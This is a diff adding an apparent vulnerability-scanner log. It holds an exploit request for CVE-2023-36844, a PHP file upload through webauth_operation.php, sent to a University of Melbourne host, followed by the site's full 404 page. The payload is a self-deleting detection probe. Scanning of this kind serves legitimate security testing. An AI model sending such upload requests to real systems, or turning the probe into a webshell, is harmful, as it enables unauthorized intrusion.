@@ -1,0 +1,339 @@
+[CVE-2023-36844] Dumped HTTP request for https://murmotorsports.eng.unimelb.edu.au/webauth_operation.php
+
+
+POST /webauth_operation.php HTTP/1.1
+Host: murmotorsports.eng.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 176
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,KCc8P3BocCBlY2hvIG1kNSgnQ1ZFLTIwMjMtMzY4NDQnKTt1bmxpbmsoX19GSUxFX18pOz8+Jyk=", "fileName": "ccbac.php", "csize": 56}]
+[CVE-2023-36844] Dumped HTTP response https://murmotorsports.eng.unimelb.edu.au/webauth_operation.php
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Origin: cms.unimelb.edu.au
+Cache-Control: max-age=0, private
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:06 GMT
+Expires: Wed, 06 Aug 2025 15:18:05 GMT
+Pragma: no-cache
+Server: openresty
+Set-Cookie: SQ_SYSTEM_SESSION=eb5064a4da49c18a6a58eb5f01055487; path=/; HttpOnly
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+Vary: Origin
+Via: 1.1 squizedge.net
+X-Content-Type-Options: nosniff
+X-Request-Id: ba398d63-f8bf-4c03-8eaf-43d394848b8f
+X-Upgrade-Enabled: off
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+
+
+<meta charset="utf-8">
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<link rel="icon" href="/__data/assets/image/0012/4587591/favicon.png">
+<title></title>
+<!--
+Website maintained by: info@murmotorsports.com
+Last updated by:  on 
+Last published by:  on 
+System: MCE Gen3
+    This website uses the centrally managed Design and Content Management System.  
+    https://www.unimelb.edu.au/web
+    Asset ID: #
+
+-->
+
+<meta name="title" content="">
+<meta name="description" content="">
+<meta name="last-modified" content="">
+
+<meta name="robots" content="">
+<meta name="robots" content="noodp">
+<link rel="canonical" href="">
+<meta name="geo.placename" content="Victoria, Australia, Oceania, World">
+<meta name="geo.region" content="AU">
+<meta name="geo.client.location" content="US">
+<meta name="google-site-verification" content="14L1qmSifouVkhuHJ_bjLKfy8ySshqb5pHTkKOiSI6Q">
+<meta name="msvalidate.01" content="0F1033BC88958D439A8B529D66FCD079">
+
+
+<meta name="DC.Creator" content="">
+<meta name="DC.Date" content="">
+<meta name="MCE.Template" content="">
+<meta name="MCE.Paintlayout" content=" ">
+
+
+<meta property="og:type" content="website">
+<!--<meta property="fb:app_id" content="933889623386823">-->
+<meta property="og:url" content=" ">
+<meta property="og:title" content="">
+<meta property="og:description" content="">
+<meta property="og:site_name" content="MUR Motorsports">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@unimelb">
+<meta name="twitter:title" content="">
+<meta name="twitter:description" content="">
+<!-- og:image and twitter:image needs to be set on details screen to appear here -->
+
+  
+
+  
+ 
+        
+        
+        
+        
+        <link rel="stylesheet" href="//dds-gen3.web.unimelb.edu.au/v15.8.2/uom.css">
+        <script src="//dds-gen3.web.unimelb.edu.au/v15.8.2/uom.js"></script> 
+    
+
+  
+
+ 
+ 
+	
+	<link rel="stylesheet" href="https://cms.unimelb.edu.au/__data/assets/css_file_folder/0008/3224951/uom-mce-gen3.css?v=1.0.103">
+
+
+<script type="module" src="https://dds-gen3.web.unimelb.edu.au/ui-core-web-components/v0.0.1/modular/client/mega-menu.js"></script><!-- custom head extras start -->
+
+<!-- custom head extras end -->
+<!--
+  Running Squiz Matrix
+  Developed by Squiz - http://www.squiz.net
+  Squiz, Squiz Matrix, MySource, MySource Matrix and Squiz.net are registered Trademarks of Squiz Pty Ltd
+  Page generated: 07 August 2025 01:18:05
+-->
+
+
+</head>
+<body class="">
+  
+<div class="skip-link">
+      <a href="#main-content" class="skip-link__anchor" data-no-scroll>
+        Skip to main content
+      </a>
+    </div>
+
+<div class="uomcontent" role="document">
+    <div class="page-inner">
+        
+        
+  
+                            <ol class="page-local-history" itemscope="" itemtype="https://schema.org/BreadcrumbList">
+                    <li class="root" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+                        <a href="https://cms.unimelb.edu.au" itemprop="item"><span itemprop="name">Matrix CMS</span></a>
+                        <meta content="1" itemprop="position">
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                                            <li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem">
+                           <a href="https://cms.unimelb.edu.au/404" itemprop="item"><span itemprop="name">404</span></a>
+                           <meta content="2" itemprop="position">
+                        </li>
+                                    </ol>
+                    
+
+        
+        
+                
+        
+        <div class='main' id='main-content' role='main'>
+            
+
+ 
+
+    
+           
+
+                    <h1 class="aligned-title">Page not found</h1>
+        
+         
+    	        	    
+
+        
+<div class="content-block" id="new_content_container_1938144_1938144">
+  <p>We are sorry, but we can't find the page you are looking for.<br>It may have been moved, or deleted.</p>
+
+  <h3>What now?</h3>
+  <ul>
+    <li>
+      <span style="display:inline">It looks like you came directly here, either by typing the address, or following a bookmark. Check the address to be sure.</span>
+      <span style="display:none">Return to the <a href="">page you were on</a></span>
+    </li>
+    <li>Try starting from the <a href="https://murmotorsports.eng.unimelb.edu.au">home page</a></li>
+    <li>Try <a href="http://search.unimelb.edu.au/?q=*+site:murmotorsports.eng.unimelb.edu.au">searching pages on this site</a></li>
+    <li><a data-modal-target="report-modal" href="#report">Report this problem</a></li>
+    <li>Enjoy the quotation below from one of the remarkable people associated with The University of Melbourne.</li>
+  </ul>
+
+
+</div>
+<div class="modal__dialog" id="report-modal">
+  <a class="modal__close">Close</a>
+  
+    <form id="form_email_1890286" enctype="multipart/form-data" action="https://cms.unimelb.edu.au/central-site-management/forms/404" method="post">
+      <input type="hidden" name="SQ_FORM_1890286_PAGE" id="SQ_FORM_1890286_PAGE" value="1" >
+      <input type="hidden" id="q1890286_q2" name="q1890286:q2" value="" >
+      <input type="hidden" id="q1890286_q4" name="q1890286:q4" value="https://murmotorsports.eng.unimelb.edu.au">
+      <input type="hidden" id="q1890286_q5" name="q1890286:q5" value="/webauth_operation.php">
+      <input type="hidden" id="q1890286_q6" name="q1890286:q6" value="info@murmotorsports.com">
+    
+        <h1 id="report">Problem report</h1>
+        <div>
+            <p>We've captured some technical details.</p>
+            <pre>You came from: Direct<br>You asked for: <span>https</span>://<span>murmotorsports.eng.unimelb.edu.au</span><span>/webauth_operation.php</span></pre>
+        </div>
+        
+       <fieldset>
+          <legend>Optional details</legend>
+          <div>
+            <label for="q1890286_q1">Email. <em>If you'd like a reply, we'll need your email address </em>:</label>
+            <input name="q1890286:q1" value="" size="30" maxlength="300" placeholder="you@somewhere.org" id="q1890286_q1" type="text">
+          </div>
+          <div>
+            <label for="q1890286_q3">Comments. <em>Anything else you'd like to tell us? </em>:</label>
+            <textarea name="q1890286:q3" cols="30" rows="3" placeholder="Any more useful details" id="q1890286_q3"></textarea>
+          </div>
+          <input type="text" name="honeypot" value="" size="10" maxlength="10" class="hidden" id="honeypot" title="If you are a human, do not fill in this field.">
+        </fieldset>
+        
+        <footer>
+          <input name="form_email_1890286_submit" value="Submit" id="form_email_1890286_submit" type="submit" class="button"  />
+        </footer>
+    
+    </form>
+</div>  <section class="bg-alt">
+    <blockquote class="blockquote-classic">
+		<p>I like to think that when Medawar and his colleagues showed that immunological tolerance could be produced experimentally the new immunology was born. This is a science which to me has far greater potentialities both for practical use in medicine and for the better understanding of living process than the classical immunochemistry which it is incorporating and superseding.</p>
+		<p><cite>Frank Macfarlane Burnet 'Immunological Recognition of Self', Nobel Lecture, 12 December 1960.</cite></p>
+    </blockquote>
+
+  </section><script src="//ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+<script>
+
+var eventposted=0;
+
+$(document).ready(function(){
+ $('input.button').click(function() {
+   window.setInterval(redirect, 100);
+ });
+});
+
+function redirect(){
+ if(($(".modal__dialog").is(':visible')) && (eventposted==0)){
+   window.location = "https://cms.unimelb.edu.au/404/reported";
+   eventposted=1;
+ }
+}
+
+</script>
+
+    
+
+
+
+
+            
+            <!-- custom site footer start -->
+
+<footer class="cta">
+  <ul class="quicklinks">
+    <li> <a style="min-width:100px" class="facebook" href="//facebook.com/MURMotorsports">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-facebook"/>
+      </svg>
+      Facebook </a> </li>
+    <li> <a style="min-width:100px" class="linkedin" href="https://www.linkedin.com/company/murmotorsports">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-linkedin"></use>
+      </svg>
+      Linkedin </a> </li>
+    <li> <a style="min-width:100px" class="instagram" href="//instagram.com/murmotorsports/">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-instagram"/>
+      </svg>
+      Instagram </a> </li>
+    <li> <a class="twitter" href="//twitter.com/mur_motorsports">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-twitter"/>
+      </svg>
+      Twitter </a> </li>
+    <li> <a style="min-width:100px" class="youtube" href="https://www.youtube.com/channel/UCtLVDVgxPnNNDjxBzZlM90g">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-youtube"/>
+      </svg>
+      Youtube </a> </li>
+    <li> <a style="min-width:100px" class="email" href="https://murmotorsports.eng.unimelb.edu.au/contactus">
+      <svg class="icon" role="img">
+        <use xlink:href="#icon-mail"/>
+      </svg>
+      Contact&nbsp;us </a> </li>
+  </ul>
+  <hr />
+</footer>
+<!-- custom site footer end -->
+
+
+            
+        </div>
+        
+
+ 
+    
+ 
+         
+    <!-- has menu -->
+    
+     
+
+
+
+    </div>
+</div>
+<!-- global after body -->
+<script>
+window.utag_data = window.utag_data || {};
+window.utag_data.platform = "matrix-controlled-environment";
+</script>
+
+
+<script async="async" src="https://static.srcspot.com/libs/leonore.js"></script>
+
+    
+
+
+
+<script defer src="https://cms.unimelb.edu.au/__data/assets/js_file/0010/5214367/analyticsUoM.js?v=0.1.3"></script>
+<!-- custom after body start -->
+
+<!-- custom after body end  -->
+
+</body>
+</html>
+
+
